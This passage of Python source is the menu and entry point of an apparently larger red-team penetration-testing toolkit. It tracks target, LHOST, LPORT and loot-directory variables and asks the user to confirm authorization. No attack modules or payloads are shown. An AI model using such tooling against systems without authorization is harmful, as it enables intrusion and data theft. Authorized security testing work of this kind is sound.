    (" S", "Session Config",    "View/edit session variables"),
    (" 0", "Exit",              ""),
]

def menu():
    os.system("clear 2>/dev/null || cls 2>/dev/null")
    print(BANNER)

    tgt = SESSION["target"] or f"{DIM}(none){RESET}"
    lh  = SESSION["lhost"]  or f"{DIM}(none){RESET}"
    print(f"  {DIM}Target:{RESET} {C}{tgt}{RESET}   {DIM}LHOST:{RESET} {C}{lh}{RESET}:{C}{SESSION['lport']}{RESET}   {DIM}Started:{RESET} {SESSION['started']}")
    print(f"\n  {BOLD}{W}Select a module:{RESET}\n")

    for num, name, desc in MENU_ITEMS:
        if num == "--":
            print()
            continue
        desc_str = f"  {DIM}{desc}{RESET}" if desc else ""
        print(f"  {R}[{num.strip():>2}]{RESET} {W}{name:<22}{RESET}{desc_str}")

    choice = input(f"\n{Y}  redteam > {RESET}").strip().upper()

    if choice == "0":
        if confirm("Save session report before exit?"):
            save_report()
        print(f"\n  {DIM}Exiting. Stay authorized.{RESET}\n")
        sys.exit(0)

    elif choice == "S":
        show_session()
        print(f"\n  {BOLD}Update a session variable:{RESET}")
        key = prompt("Variable (target / lhost / lport / loot_dir / subnet)").lower()
        if key in SESSION and key != "notes":
            SESSION[key] = prompt(f"New value for {key}", SESSION[key])
            ok(f"{key} updated -> {SESSION[key]}")
        else:
            warn("Unknown variable.")

    elif choice in DISPATCH:
        try:
            DISPATCH[choice]()
        except KeyboardInterrupt:
            print(f"\n  {Y}[!] Module interrupted{RESET}")
    else:
        warn("Invalid choice.")

    input(f"\n  {DIM}Press Enter to return to menu...{RESET}")
    menu()


# ─────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────
if __name__ == "__main__":
    print(f"\n{Y}  [WARNING] For authorized penetration testing only.{RESET}")
    print(f"  {DIM}Unauthorized use is illegal. You are responsible for your actions.{RESET}\n")
    if not confirm("I confirm I have authorization to test the target system"):
        print(f"\n  {DIM}Aborted.{RESET}\n")
        sys.exit(0)
    try:
        menu()
    except KeyboardInterrupt:
        print(f"\n\n  {DIM}Interrupted. Exiting.{RESET}\n")
        sys.exit(0)
